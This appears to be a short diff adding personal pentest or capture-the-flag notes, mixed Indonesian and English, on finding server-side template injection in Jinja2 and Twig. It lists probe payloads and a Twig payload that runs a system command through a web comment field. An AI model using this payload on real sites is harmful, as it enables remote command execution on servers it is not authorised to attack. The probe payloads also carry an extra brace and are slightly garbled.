@@ -1,0 +1,19 @@
+cek apakah terdapat SSTI
+- Jinja2
+	- When the payload {{{7*'7'}} is executed, it returns 7777777.
+- Twig
+	- Running the payload {{{7*'7'}} will return 49
+
+dalam hal ini contohnya disini kita bisa melakukan inputnya SSTI ke comment di page web.
+```
+What is your name?
+`
+asdasd
+`
+
+What is your comment?
+`
+{{['<command>']|filter('system')}}
+`
+```
+
